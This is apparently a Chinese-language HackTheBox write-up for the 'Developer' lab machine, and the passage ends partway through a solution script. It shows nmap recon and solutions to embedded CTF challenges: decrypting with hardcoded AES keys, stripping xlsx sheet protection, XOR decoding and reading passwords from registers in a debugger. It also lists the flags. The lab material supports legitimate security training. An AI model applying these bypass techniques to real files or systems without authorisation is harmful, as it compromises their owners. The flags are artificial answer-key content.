{"pageProps":{"postData":{"id":"HackTheBoxMachine - Developer","contentHtml":"<h1>Machine - Developer</h1>\n<blockquote>\n<p><a href=\"https://app.hackthebox.com/machines/Developer\">https://app.hackthebox.com/machines/Developer</a> | <code>Linux</code> | <code>Hard</code></p>\n</blockquote>\n<p><img src=\"/post-images/HackTheBoxMachine%20-%20Developer/image.png\" alt=\"image.png\"></p>\n<h2>Recon</h2>\n<pre><code class=\"hljs language-bash\">➜  Developer nmap -sT -min-rate 5000 -p- 10.10.11.103\nStarting Nmap 7.95 ( https://nmap.org ) at 2025-06-21 12:45 CST \nNmap scan report <span class=\"hljs-keyword\">for</span> 10.10.11.103\nHost is up (0.092s latency).\nNot shown: 59816 filtered tcp ports (no-response), 5717 closed tcp ports (conn-refused)\nPORT   STATE SERVICE\n22/tcp open  ssh\n80/tcp open  http\n\nNmap <span class=\"hljs-keyword\">done</span>: 1 IP address (1 host up) scanned <span class=\"hljs-keyword\">in</span> 110.48 seconds\n</code></pre>\n<pre><code class=\"hljs language-bash\">➜  Developer nmap -sT -A -p 22,80 10.10.11.103       \nStarting Nmap 7.95 ( https://nmap.org ) at 2025-06-21 12:48 CST\nNmap scan report <span class=\"hljs-keyword\">for</span> 10.10.11.103\nHost is up (0.23s latency).\n\nPORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey: \n|   3072 36:aa:93:e4:a4:56:ab:39:86:66:bf:3e:09:fa:eb:e0 (RSA)\n|   256 11:fb:e9:89:2e:4b:66:40:7b:6b:01:cf:f2:f2:ee:ef (ECDSA)\n|_  256 77:56:93:6e:5f:ea:e2:ad:b0:2e:cf:23:9d:66:ed:12 (ED25519)\n80/tcp open  http    Apache httpd 2.4.41\n|_http-title: Did not follow redirect to http://developer.htb/\n|_http-server-header: Apache/2.4.41 (Ubuntu)\nWarning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port\nDevice <span class=\"hljs-built_in\">type</span>: general purpose\nRunning: Linux 4.X|5.X\nOS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5\nOS details: Linux 4.15 - 5.19\nNetwork Distance: 2 hops\nService Info: Host: developer.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nTRACEROUTE (using proto 1/icmp)\nHOP RTT      ADDRESS\n1   99.02 ms 10.10.16.1\n2   99.78 ms 10.10.11.103\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap <span class=\"hljs-keyword\">done</span>: 1 IP address (1 host up) scanned <span class=\"hljs-keyword\">in</span> 18.70 seconds\n</code></pre>\n<p>访问 <code>HTTP</code></p>\n<p><img src=\"/post-images/HackTheBoxMachine%20-%20Developer/image1.png\" alt=\"image.png\"></p>\n<p>可以创建账户，注册一个用户 <code>sunset</code> ，创建完毕后会直接进入后台</p>\n<p><img src=\"/post-images/HackTheBoxMachine%20-%20Developer/image2.png\" alt=\"image.png\"></p>\n<p>里面会有一些CTF题？让你做？</p>\n<p><img src=\"/post-images/HackTheBoxMachine%20-%20Developer/image3.png\" alt=\"image.png\"></p>\n<h2>CTF</h2>\n<h3>PES</h3>\n<p>题目会给出一个<code>EXE</code>文件合一串加密后的字符串：<code>X/o8VJQE1pyQhjmpcwk45+L069bivpF63PjZP4z7ahKaC+jv89NT6ze0T5id0lWC</code></p>\n<p>对程序进行反编译，在<code>PS2EXE</code>中的<code>Main</code>中能找到一串<code>base64</code>编码后的字符串</p>\n<p><img src=\"/post-images/HackTheBoxMachine%20-%20Developer/image4.png\" alt=\"image.png\"></p>\n<p>解码后是加密的逻辑，通过<code>AI</code>写出解密脚本即可</p>\n<pre><code class=\"hljs language-bash\"><span class=\"hljs-comment\"># ===================================================================</span>\n<span class=\"hljs-comment\"># Decryption Script for FullCrypto</span>\n<span class=\"hljs-comment\"># We are reversing the logic from the original Encrypt-String function</span>\n<span class=\"hljs-comment\"># ===================================================================</span>\n\n<span class=\"hljs-comment\"># 加载必要的程序集</span>\n[void] [System.Reflection.Assembly]::LoadWithPartialName(<span class=\"hljs-string\">\"System.Security\"</span>)\nAdd-Type -AssemblyName System.Security\n\n<span class=\"hljs-keyword\">function</span> Decrypt-String(<span class=\"hljs-variable\">$base64String</span>) {\n    <span class=\"hljs-comment\"># --- 这些是我们在原脚本中找到的硬编码秘密 ---</span>\n    <span class=\"hljs-variable\">$Passphrase</span> = <span class=\"hljs-string\">\"AmazinglyStrongPassword\"</span>\n    <span class=\"hljs-variable\">$salt</span>       = <span class=\"hljs-string\">\"CrazilySimpleSalt\"</span>\n    <span class=\"hljs-variable\">$init</span>       = <span class=\"hljs-string\">\"StupidlyEasy_IV\"</span>\n    <span class=\"hljs-comment\"># ----------------------------------------------</span>\n\n    <span class=\"hljs-comment\"># 1. 准备 Rijndael (AES) 对象</span>\n    <span class=\"hljs-variable\">$r</span> = New-Object System.Security.Cryptography.RijndaelManaged\n\n    <span class=\"hljs-comment\"># 2. 准备密码和盐值的字节数组 (必须和加密时完全一样)</span>\n    <span class=\"hljs-variable\">$passBytes</span> = [System.Text.Encoding]::UTF8.GetBytes(<span class=\"hljs-variable\">$Passphrase</span>)\n    <span class=\"hljs-variable\">$saltBytes</span> = [System.Text.Encoding]::UTF8.GetBytes(<span class=\"hljs-variable\">$salt</span>)\n\n    <span class=\"hljs-comment\"># 3. 生成密钥 (必须和加密时完全一样)</span>\n    <span class=\"hljs-comment\"># 使用 PasswordDeriveBytes, SHA1, 5次迭代, 生成32字节密钥</span>\n    <span class=\"hljs-variable\">$r</span>.Key = (New-Object System.Security.Cryptography.PasswordDeriveBytes <span class=\"hljs-variable\">$passBytes</span>, <span class=\"hljs-variable\">$saltBytes</span>, <span class=\"hljs-string\">\"SHA1\"</span>, 5).GetBytes(32)\n\n    <span class=\"hljs-comment\"># 4. 生成 IV (必须和加密时完全一样)</span>\n    <span class=\"hljs-comment\"># 计算 IV 种子的 SHA1 哈希，并取前16个字节</span>\n    <span class=\"hljs-variable\">$r</span>.IV = (New-Object System.Security.Cryptography.SHA1Managed).ComputeHash([System.Text.Encoding]::UTF8.GetBytes(<span class=\"hljs-variable\">$init</span>))[0..15]\n\n    <span class=\"hljs-comment\"># 5. 从 Base64 字符串解码出加密后的字节数组</span>\n    try {\n        <span class=\"hljs-variable\">$encryptedBytes</span> = [System.Convert]::FromBase64String(<span class=\"hljs-variable\">$base64String</span>)\n    } catch {\n        Write-Error <span class=\"hljs-string\">\"Invalid Base64 string. Cannot decrypt.\"</span>\n        <span class=\"hljs-built_in\">return</span>\n    }\n\n    <span class=\"hljs-comment\"># 6. 创建解密器并执行解密</span>\n    <span class=\"hljs-variable\">$c</span> = <span class=\"hljs-variable\">$r</span>.CreateDecryptor()\n    <span class=\"hljs-variable\">$ms</span> = New-Object System.IO.MemoryStream @(,<span class=\"hljs-variable\">$encryptedBytes</span>)\n    <span class=\"hljs-variable\">$cs</span> = New-Object System.Security.Cryptography.CryptoStream <span class=\"hljs-variable\">$ms</span>, <span class=\"hljs-variable\">$c</span>, <span class=\"hljs-string\">\"Read\"</span>\n    <span class=\"hljs-variable\">$sr</span> = New-Object System.IO.StreamReader <span class=\"hljs-variable\">$cs</span>\n\n    <span class=\"hljs-comment\"># 7. 读取解密后的明文</span>\n    <span class=\"hljs-variable\">$decryptedString</span> = <span class=\"hljs-variable\">$sr</span>.ReadToEnd()\n\n    <span class=\"hljs-comment\"># 8. 清理资源并返回结果</span>\n    <span class=\"hljs-variable\">$sr</span>.Close()\n    <span class=\"hljs-variable\">$cs</span>.Close()\n    <span class=\"hljs-variable\">$ms</span>.Close()\n    <span class=\"hljs-variable\">$r</span>.Clear()\n\n    <span class=\"hljs-built_in\">return</span> <span class=\"hljs-variable\">$decryptedString</span>\n}\n\n<span class=\"hljs-comment\"># --- 使用方法 ---</span>\n<span class=\"hljs-comment\"># 将你在挑战中得到的加密字符串替换到下面的变量中</span>\n<span class=\"hljs-variable\">$encryptedData</span> = <span class=\"hljs-string\">\"这里放你要解密的Base64字符串\"</span>\n\n<span class=\"hljs-comment\"># 调用解密函数</span>\n<span class=\"hljs-variable\">$decryptedResult</span> = Decrypt-String -base64String <span class=\"hljs-variable\">$encryptedData</span>\n\n<span class=\"hljs-comment\"># 输出解密结果</span>\nWrite-Host <span class=\"hljs-string\">\"Decryption Result:\"</span> -ForegroundColor Green\nWrite-Host <span class=\"hljs-variable\">$decryptedResult</span>\n\n</code></pre>\n<pre><code class=\"hljs language-bash\">PS D:\\System\\Downloads\\20250620> .\\pass.ps1\nDecryption Result:\nDHTB{P0w3rsh3lL_F0r3n51c_M4dn3s5}\n</code></pre>\n<h3>Phished List</h3>\n<p>给一个<code>xlsx</code>文件，听说文档中包含密码</p>\n<p>像是隐写题，上网搜索了下，<code>docs</code>和<code>xlsx</code>基本上就是<code>zip</code>文件，我们对其进行解压</p>\n<p>然后找到 <code>phished_credentials\\xl\\worksheets\\sheet1.xml</code> ,在最底下能找到</p>\n<pre><code class=\"hljs language-bash\">&#x3C;sheetProtection \nalgorithmName=<span class=\"hljs-string\">\"SHA-512\"</span> \nhashValue=<span class=\"hljs-string\">\"Y4Ko7kZUKStIxaVGWEtuMeRdnCiN7O3D8qZtKdo/2jP7WE6yzKQXUcSWQ/E0OrqHCzhOBFX+t8Db5Pxaiu+N1g==\"</span> \nsaltValue=<span class=\"hljs-string\">\"EoiHQklf0FagPs+iW0OzkA==\"</span> \nspinCount=<span class=\"hljs-string\">\"100000\"</span> \nsheet=<span class=\"hljs-string\">\"1\"</span> \nobjects=<span class=\"hljs-string\">\"1\"</span> \nscenarios=<span class=\"hljs-string\">\"1\"</span>/>\n</code></pre>\n<p>我们将 <code>sheet1.xml</code> 的<code>sheetProtection</code> 块删掉后，再放进去替换掉原本的 <code>sheet1.xml</code> 即可</p>\n<p><img src=\"/post-images/HackTheBoxMachine%20-%20Developer/image5.png\" alt=\"image.png\"></p>\n<pre><code class=\"hljs language-bash\">DHTB{H1dD3N_C0LuMn5_FtW}\n</code></pre>\n<h3>Lucky Guess</h3>\n<p>压缩包解压后是一个程序，我们直接<code>IDA</code>打开</p>\n<p><code>winner</code>函数</p>\n<p><img src=\"/post-images/HackTheBoxMachine%20-%20Developer/image6.png\" alt=\"image.png\"></p>\n<p><code>AI</code>编写异或脚本</p>\n<pre><code class=\"hljs language-bash\"><span class=\"hljs-comment\"># C 代码中的变量</span>\nkey = <span class=\"hljs-string\">\"98hKjr3f8CgfF\"</span>\nciphertext = <span class=\"hljs-string\">\"^w!%-%z2p7/# uw?\"</span>\n\n<span class=\"hljs-comment\"># 用于存放解密结果的变量</span>\nplaintext = <span class=\"hljs-string\">\"\"</span>\n\n<span class=\"hljs-comment\"># 遍历密文中的每一个字符</span>\n<span class=\"hljs-keyword\">for</span> i <span class=\"hljs-keyword\">in</span> range(len(ciphertext)):\n    <span class=\"hljs-comment\"># 1. 取出密文字符和对应的密钥字符</span>\n    <span class=\"hljs-comment\">#    使用模运算 (%) 来实现密钥的循环使用</span>\n    cipher_char = ciphertext[i]\n    key_char = key[i % len(key)]\n    \n    <span class=\"hljs-comment\"># 2. 进行异或 (XOR) 运算</span>\n    <span class=\"hljs-comment\">#    ord() 获取字符的ASCII码，^ 是异或操作符</span>\n    decrypted_char_code = ord(cipher_char) ^ ord(key_char)\n    \n    <span class=\"hljs-comment\"># 3. 应用特殊处理规则</span>\n    <span class=\"hljs-keyword\">if</span> decrypted_char_code &#x3C;= 31:\n        decrypted_char_code += 32\n        \n    <span class=\"hljs-comment\"># 4. 将解密后的ASCII码转换回字符，并拼接到结果字符串中</span>\n    <span class=\"hljs-comment\">#    chr() 将ASCII码转为字符</span>\n    plaintext += chr(decrypted_char_code)\n\n<span class=\"hljs-comment\"># 按照格式输出最终的 Flag</span>\nflag = f<span class=\"hljs-string\">\"DHTB{{{plaintext}}}\"</span>\n<span class=\"hljs-built_in\">print</span>(flag)\n</code></pre>\n<pre><code class=\"hljs language-bash\">➜  Developer python getpass.py                                              \nDHTB{gOInGWITHtHEfLOW}\n</code></pre>\n<h3>Authenication</h3>\n<p>I developed a new authentication mechanism using rust. Can you reverse my password?</p>\n<p><code>rust</code> 逆向</p>\n<pre><code class=\"hljs language-bash\">➜  Developer ./authenticate                                    \nWelcome to TheCyberGeek<span class=\"hljs-string\">'s authentication platform\nEnter the password to proceed: \nsdadad\nYou are unauthorized to use this application!\n➜  Developer file authenticate \nauthenticate: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=95ac617025cf1bfe1e6749172a7888dfc4fe4dfe, for GNU/Linux 3.2.0, with debug_info, not stripped\n</span></code></pre>\n<p>进去要你输入密码然后验证，<code>IDA</code>打开，找到验证的部分</p>\n<p><img src=\"/post-images/HackTheBoxMachine%20-%20Developer/image7.png\" alt=\"image.png\"></p>\n<p>其中的这行代码正在执行 <code>v3 == v5</code> 的比较，并把结果（<code>true</code> 或 <code>false</code>）存起来</p>\n<pre><code class=\"hljs language-bash\">HIBYTE(v2.pieces.data_ptr) = core::cmp::impls::_$LT$impl$u20<span class=\"hljs-variable\">$core</span>..cmp..PartialEq$LT$$RF$B$GT$$u20$<span class=\"hljs-keyword\">for</span>$u20$$RF$A$GT$::eq::h372d5aaf05c06316(\n                                 &#x26;v3,\n                                 &#x26;v5);\n</code></pre>\n<p>其中一个应该是用户输入的，然后和<code>v3</code> 或者 <code>v5</code> 去比较，所以我们要在<code>v3</code>或者<code>v5</code> 处断点，就可以看到是和什么在对比</p>\n<pre><code class=\"hljs language-bash\">➜  Developer pwndbg authenticate \nReading symbols from authenticate...\npwndbg: loaded 190 pwndbg commands. Type pwndbg [filter] <span class=\"hljs-keyword\">for</span> a list.\npwndbg: created 13 GDB <span class=\"hljs-built_in\">functions</span> (can be used with <span class=\"hljs-built_in\">print</span>/break). Type <span class=\"hljs-built_in\">help</span> <span class=\"hljs-keyword\">function</span> to see them.\n------- tip of the day (<span class=\"hljs-built_in\">disable</span> with <span class=\"hljs-built_in\">set</span> show-tips off) -------\nIf you want Pwndbg to clear screen on each <span class=\"hljs-built_in\">command</span> (but still save previous output <span class=\"hljs-keyword\">in</span> <span class=\"hljs-built_in\">history</span>) use <span class=\"hljs-built_in\">set</span> context-clear-screen on\npwndbg> info <span class=\"hljs-built_in\">functions</span>\n...\n0x0000000000008e30  main::validate\n0x00000000000090f0  main::authenticated                                                                           \n0x0000000000009130  main::check_password                                                                          \n0x0000000000009240  main::main                 \n0x0000000000009360  main   \n...\npwndbg> disassemble 0x0000000000009130\n...\n   0x00000000000091af &#x3C;+127>:   mov    rcx,QWORD PTR [rsp+0x10]                                                   \n   0x00000000000091b4 &#x3C;+132>:   mov    QWORD PTR [rsp+0x60],rcx                                                   \n   0x00000000000091b9 &#x3C;+137>:   lea    rdi,[rsp+0x38]\n   0x00000000000091be &#x3C;+142>:   lea    rsi,[rsp+0x58]\n   0x00000000000091c3 &#x3C;+147>:   call   0x7a80 &#x3C;_ZN4core3cmp5impls69_$LT$impl$u20<span class=\"hljs-variable\">$core</span>..cmp..PartialEq$LT$$RF$B$GT$$u20$<span class=\"hljs-keyword\">for</span>$u20$$RF$A$GT<span class=\"hljs-variable\">$2eq17h372d5aaf05c06316E</span>>\n   0x00000000000091c8 &#x3C;+152>:   mov    BYTE PTR [rsp+0x7],al                                                      \n   0x00000000000091cc &#x3C;+156>:   jmp    0x91ce &#x3C;_ZN4main14check_password17h1ae7b2b87f21bd0aE+158>                  \n   0x00000000000091ce &#x3C;+158>:   lea    rdi,[rsp+0x40]  \n   0x00000000000091d3 &#x3C;+163>:   call   0x9db0 &#x3C;_ZN4core3ptr13drop_in_place17h5e2052686c20525eE>                   \n   0x00000000000091d8 &#x3C;+168>:   mov    al,BYTE PTR [rsp+0x7]                                                      \n   0x00000000000091dc &#x3C;+172>:   <span class=\"hljs-built_in\">test</span>   al,0x1 \n...\n</code></pre>\n<p><code>0x00000000000091c3</code> 是我们想要断点的地方，但是可能有<code>ALSR</code> ，我们不能直接断点</p>\n<pre><code class=\"hljs language-bash\">pwndbg> b main\nBreakpoint 1 at 0x9360\npwndbg> r\n────────────────────────────────────────────────────────────────────────────────────────────────[ DISASM / x86-64 / <span class=\"hljs-built_in\">set</span> <span class=\"hljs-built_in\">emulate</span> on ]────────────────────────────────────────────────────────────────────────────────────────────────\n ► 0x55555555d360 &#x3C;main>                                                                                          push   rax\n   0x55555555d361 &#x3C;main+1>                                                                                        movsxd rax, edi                 RAX => 1\n   0x55555555d364 &#x3C;main+4>                                                                                        lea    rdi, [rip - 0x12b]       RDI => 0x55555555d240 (main::main) ◂— sub rsp, 0xb8\n   0x55555555d36b &#x3C;main+11>                                                                                       mov    qword ptr [rsp], rsi     [0x7fffffffdf40] &#x3C;= 0x7fffffffe058 —▸ 0x7fffffffe35d ◂— <span class=\"hljs-string\">'/root/Desktop/HackTheBox/Developer/authenticate'</span>\n   0x55555555d36f &#x3C;main+15>                                                                                       mov    rsi, rax                 RSI => 1\n   0x55555555d372 &#x3C;main+18>                                                                                       mov    rdx, qword ptr [rsp]     RDX, [0x7fffffffdf40] => 0x7fffffffe058 —▸ 0x7fffffffe35d ◂— <span class=\"hljs-string\">'/root/Desktop/HackTheBox/Developer/authenticate'</span>\n   0x55555555d376 &#x3C;main+22>                                                                                       call   std::rt::lang_start         &#x3C;std::rt::lang_start>\n \n   0x55555555d37b &#x3C;main+27>                                                                                       pop    rcx\n   0x55555555d37c &#x3C;main+28>                                                                                       ret    \n \n   0x55555555d37d                                                                                                 nop    dword ptr [rax]\n   0x55555555d380 &#x3C;&#x3C;<span class=\"hljs-string\">alloc::vec::Vec&#x3C;T> as alloc</span>::vec::SpecExtend&#x3C;&#x26;T,core::slice::iter::Iter&#x3C;T>>>::spec_extend>    sub    rsp, 0x28\n</code></pre>\n<p>能看到地址都变成了<code>0x55555555dxxx</code></p>\n<pre><code class=\"hljs language-bash\">0x555555554000 + 0x91c3 = 0x55555555d1c3\n</code></pre>\n<p>然后再在<code>0x55555555d1c3</code>处断点</p>\n<pre><code class=\"hljs language-bash\">pwndbg> b *0x55555555d1c3\nBreakpoint 2 at 0x55555555d1c3\npwndbg> c\nContinuing.\nWelcome to TheCyberGeek<span class=\"hljs-string\">'s authentication platform\nEnter the password to proceed: \nwhat（随便输入）\n</span></code></pre>\n<p><img src=\"/post-images/HackTheBoxMachine%20-%20Developer/image8.png\" alt=\"image.png\"></p>\n<p><img src=\"/post-images/HackTheBoxMachine%20-%20Developer/image9.png\" alt=\"image.png\"></p>\n<p>可以看到 <code>what</code>是和<code>DHTB{rusty_bu5in3s5}</code> 在比较</p>\n<pre><code class=\"hljs language-bash\">➜  Developer ./authenticate\nWelcome to TheCyberGeek<span class=\"hljs-string\">'s authentication platform\nEnter the password to proceed: \nDHTB{rusty_bu5in3s5}\nYou have successfully authenticated!\n</span></code></pre>\n<pre><code class=\"hljs language-bash\">DHTB{rusty_bu5in3s5}\n</code></pre>\n<h3>RevMe</h3>\n<p>直接就能拿到 <code>flag</code></p>\n<p><img src=\"/post-images/HackTheBoxMachine%20-%20Developer/image10.png\" alt=\"image.png\"></p>\n<pre><code class=\"hljs language-bash\">DHTB{TCG5_S1mPl3_R3v3r51nG_Ch4773nG3}\n</code></pre>\n<h3>PwnMe</h3>\n<p><code>PWN</code>题目，checksec，<code>NX</code>和<code>PIE</code>都开了</p>\n<pre><code class=\"hljs language-bash\">➜  Developer checksec pwnme  \n[*] Checking <span class=\"hljs-keyword\">for</span> new versions of pwntools\n    To <span class=\"hljs-built_in\">disable</span> this functionality, <span class=\"hljs-built_in\">set</span> the contents of /root/.cache/.pwntools-cache-3.13/update to <span class=\"hljs-string\">'never'</span> (old way).\n    Or add the following lines to ~/.pwn.conf or ~/.config/pwn.conf (or /etc/pwn.conf system-wide):\n        [update]\n        interval=never\n[*] You have the latest version of Pwntools (4.14.1)\n[*] <span class=\"hljs-string\">'/root/Desktop/HackTheBox/Developer/pwnme'</span>\n    Arch:       amd64-64-little\n    RELRO:      Partial RELRO\n    Stack:      No canary found\n    NX:         NX enabled\n    PIE:        PIE enabled\n    Stripped:   No\n</code></pre>\n<p>但是貌似并不用看这个，也像是逆向题目，下边是<code>main</code>函数</p>\n<pre><code class=\"hljs language-bash\">int __fastcall main(int argc, const char **argv, const char **envp)\n{\n  char *v3; // rax\n  char s[8]; // [rsp+10h] [rbp-20h] BYREF\n  __int64 v6; // [rsp+18h] [rbp-18h]\n  int v7; // [rsp+20h] [rbp-10h]\n  char *v8; // [rsp+28h] [rbp-8h]\n\n  <span class=\"hljs-keyword\">if</span> ( argc > 1 )\n  {\n    <span class=\"hljs-keyword\">if</span> ( (unsigned int)check_password(argv[1], argv, envp) )\n    {\n      puts(<span class=\"hljs-string\">\"Password correct. Here's a flag:\"</span>);\n      *(_QWORD *)s = 0xC384B2CB92A49894LL;\n      v6 = 0x8796C283C680B381LL;\n      v7 = 13486015;\n      v8 = s;\n      <span class=\"hljs-keyword\">while</span> ( *v8 )\n      {\n        v3 = v8++;\n        *v3 -= 80;\n      }\n      puts(s);\n    }\n    <span class=\"hljs-keyword\">else</span>\n    {\n      puts(<span class=\"hljs-string\">\"Wrong password.\"</span>);\n    }\n  }\n  <span class=\"hljs-keyword\">else</span>\n  {\n    puts(<span class=\"hljs-string\">\"Please enter your password as a program argument!\"</span>);\n  }\n  <span class=\"hljs-built_in\">return</span> 0;\n}\n</code></pre>\n<p>主要及时要看<code>check_password</code></p>\n<pre><code class=\"hljs language-bash\">__int64 __fastcall check_password(const char *a1)\n{\n  char *v1; // rax\n  char v3[8]; // [rsp+13h] [rbp-3Dh] BYREF\n  char s2[16]; // [rsp+20h] [rbp-30h] BYREF\n  char dest[16]; // [rsp+30h] [rbp-20h] BYREF\n  char *v6; // [rsp+40h] [rbp-10h]\n  unsigned int v7; // [rsp+4Ch] [rbp-4h]\n\n  v7 = 0;\n  strcpy(v3, <span class=\"hljs-string\">\"门赖旅惫杀緝\"</span>);\n  v6 = v3;\n  <span class=\"hljs-keyword\">while</span> ( *v6 )\n  {\n    v1 = v6++;\n    *v1 -= 80;\n  }\n  strcpy(dest, a1);\n  strcpy(s2, v3);\n  <span class=\"hljs-keyword\">if</span> ( !strcmp(dest, s2) )\n    <span class=\"hljs-built_in\">return</span> 1;\n  <span class=\"hljs-built_in\">return</span> v7;\n}\n</code></pre>\n<p><code>a1</code>是我们的键入的参数，主要的解密逻辑是在：</p>\n<pre><code class=\"hljs language-bash\">  <span class=\"hljs-keyword\">while</span> ( *v6 )\n  {\n    v1 = v6++;\n    *v1 -= 80;\n  }\n</code></pre>\n<p>程序遍历这个神秘字符串（<code>v3</code>）的每一个字节，并将每个字节的值减去 <code>80</code></p>\n<p>但是最后还是会在<code>if ( !strcmp(dest, s2) )</code> 处进行对比，我们还是在那断点，查看一下寄存器的值</p>\n<p>我们要在<code>0x00000000000011de</code> 处断点</p>\n<pre><code class=\"hljs language-bash\">0x00000000000011d8 &#x3C;+131>:   mov    rsi,rdx\n0x00000000000011db &#x3C;+134>:   mov    rdi,rax\n0x00000000000011de &#x3C;+137>:   call   0x1050 &#x3C;strcmp@plt>\n0x00000000000011e3 &#x3C;+142>:   <span class=\"hljs-built_in\">test</span>   eax,eax\n</code></pre>\n<p>和之前一样，因为有<code>ALSR</code>，所以我们要在<code>main</code>处断点</p>\n<pre><code class=\"hljs language-bash\"> ► 0x5555555551f7 &#x3C;main+4>      sub    rsp, 0x30                       RSP => 0x7fffffffdf30 (0x7fffffffdf60 - 0x30)\n   0x5555555551fb &#x3C;main+8>      mov    dword ptr [rbp - 0x24], edi     [0x7fffffffdf3c] &#x3C;= 1\n   0x5555555551fe &#x3C;main+11>     mov    qword ptr [rbp - 0x30], rsi     [0x7fffffffdf30] &#x3C;= 0x7fffffffe078 —▸ 0x7fffffffe372 ◂— <span class=\"hljs-string\">'/root/Desktop/HackTheBox/Developer/pwnme'</span>\n   0x555555555202 &#x3C;main+15>     cmp    dword ptr [rbp - 0x24], 1       1 - 1     EFLAGS => 0x246 [ cf PF af ZF sf IF <span class=\"hljs-built_in\">df</span> of ac ]\n   0x555555555206 &#x3C;main+19>   ✘ jg     main+38                     &#x3C;main+38>\n \n   0x555555555208 &#x3C;main+21>     lea    rdi, [rip + 0xdf9]              RDI => 0x555555556008 ◂— <span class=\"hljs-string\">'Please enter your password as a program argument!'</span>\n   0x55555555520f &#x3C;main+28>     call   puts@plt                    &#x3C;puts@plt>\n \n   0x555555555214 &#x3C;main+33>     jmp    main+175                    &#x3C;main+175>\n    ↓\n   0x5555555552a2 &#x3C;main+175>    mov    eax, 0     EAX => 0\n   0x5555555552a7 &#x3C;main+180>    leave  \n   0x5555555552a8 &#x3C;main+181>    ret    \n</code></pre>\n<pre><code class=\"hljs language-bash\">pwndbg> b *0x5555555551de\nBreakpoint 2 at 0x5555555551de\npwndbg> c                                  \nContinuing.                                                                                                       \n                                                                                                                  \nBreakpoint 2, 0x00005555555551de <span class=\"hljs-keyword\">in</span> check_password ()                                                             \nLEGEND: STACK | HEAP | CODE | DATA | WX | RODATA \n───────────────────────────────────────────────────────────────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]───────────────────────────────────────────────────────────────────────────────────────\n*RAX  0x7fffffffdef0 ◂— 0x9700333231 /* <span class=\"hljs-string\">'123'</span> */                                                                  \n RBX  0x7fffffffe068 —▸ 0x7fffffffe36e ◂— <span class=\"hljs-string\">'/root/Desktop/HackTheBox/Developer/pwnme'</span>\n*RCX  0x336e6179696173                                                                                                                                                                                                              \n*RDX  0x7fffffffdee0 ◂— <span class=\"hljs-string\">'supersaiyan3'</span>  \n*RDI  0x7fffffffdef0 ◂— 0x9700333231 /* <span class=\"hljs-string\">'123'</span> */\n*RSI  0x7fffffffdee0 ◂— <span class=\"hljs-string\">'supersaiyan3'</span>\n</code></pre>\n<p>我们能看到寄存器上的值是<code>supersaiyan3</code></p>\n<pre><code class=\"hljs language-bash\">➜  Developer ./pwnme supersaiyan3           \nPassword correct. Here<span class=\"hljs-string\">'s a flag:\nDHTB{b4s1c0v3rF7ow}\n</span></code></pre>\n<h3>Esay Encryption</h3>\n<p>需要解密<code>DRwdFjIMJiYgOi4dOhI8OjQ=</code></p>\n<p>下载会给出一个异或脚本</p>\n<pre><code class=\"hljs language-bash\"><span class=\"hljs-meta\">#!/usr/bin/python3</span>\nfrom itertools import izip, cycle\nimport <span class=\"hljs-built_in\">base64</span>\n\ndef xor_crypt_string(data, key=<span class=\"hljs-string\">'**'</span>):\n    xored = <span class=\"hljs-string\">''</span>.<span class=\"hljs-built_in\">join</span>(chr(ord(x) ^ ord(y)) <span class=\"hljs-keyword\">for</span> (x,y) <span class=\"hljs-keyword\">in</span> izip(data, cycle(key)))\n    <span class=\"hljs-built_in\">return</span> base64.encodestring(xored).strip()\n\nsecret_data = <span class=\"hljs-string\">\"&#x3C;REDACTED>\"</span>\n<span class=\"hljs-built_in\">print</span> xor_crypt_string(secret_data)\n</code></pre>\n<p>但是我们不知道<code>key</code>是什么，但是我们能知道前五位是 <code>DHTB{</code></p>\n<p><img src=\"/post-images/HackTheBoxMachine%20-%20Developer/image11.png\" alt=\"image.png\"></p>\n<p>我们反过来即可得到<code>flag</code></p>\n<p><img src=\"/post-images/HackTheBoxMachine%20-%20Developer/image12.png\" alt=\"image.png\"></p>\n<h3>Triple Whammy</h3>\n<p>We've been told these keys hold a secret message, can you decode it?</p>\n<pre><code class=\"hljs language-bash\">c249e41fc6ee70a6c72d0441360cd7714f56b95f08edfce23e\nfb9c2b4b0b07422617884a2ac6e4ea4cbf72563bd55b33894b\n7d9d9b16b6b15df288ca3c339f9a7b489e629a0a9bc3a1167f\n</code></pre>\n<p>解压后得到的脚本</p>\n<pre><code class=\"hljs language-bash\">import os\nfrom secret import flag\n\ndef bxor(ba1, ba2):\n    <span class=\"hljs-built_in\">return</span> bytes([_a ^ _b <span class=\"hljs-keyword\">for</span> _a, _b <span class=\"hljs-keyword\">in</span> zip(ba1, ba2)])\n\nkey1 = os.urandom(len(flag))\nkey2 = os.urandom(len(flag))\n\nct1 = bxor(key1, flag)\nct2 = bxor(ct1, key2)\nct3 = bxor(key2, flag)\n\n<span class=\"hljs-built_in\">print</span>(ct1.hex())\n<span class=\"hljs-built_in\">print</span>(ct2.hex())\n<span class=\"hljs-built_in\">print</span>(ct3.hex())\n</code></pre>\n<p><code>AI</code>一把梭哈</p>\n<pre><code class=\"hljs language-bash\"><span class=\"hljs-meta\">#!/usr/bin/python3</span>\n\ndef bxor(ba1, ba2):\n    <span class=\"hljs-string\">\"\"</span><span class=\"hljs-string\">\"Performs a byte-wise XOR operation on two byte strings.\"</span><span class=\"hljs-string\">\"\"</span>\n    <span class=\"hljs-built_in\">return</span> bytes([_a ^ _b <span class=\"hljs-keyword\">for</span> _a, _b <span class=\"hljs-keyword\">in</span> zip(ba1, ba2)])\n\n<span class=\"hljs-comment\"># 1. 从题目中获取的三个十六进制密文</span>\nhex_ct1 = <span class=\"hljs-string\">\"c249e41fc6ee70a6c72d0441360cd7714f56b95f08edfce23e\"</span>\nhex_ct2 = <span class=\"hljs-string\">\"fb9c2b4b0b07422617884a2ac6e4ea4cbf72563bd55b33894b\"</span>\nhex_ct3 = <span class=\"hljs-string\">\"7d9d9b16b6b15df288ca3c339f9a7b489e629a0a9bc3a1167f\"</span>\n\n<span class=\"hljs-comment\"># 2. 将十六进制字符串转换为字节（bytes）对象</span>\nct1 = bytes.fromhex(hex_ct1)\nct2 = bytes.fromhex(hex_ct2)\nct3 = 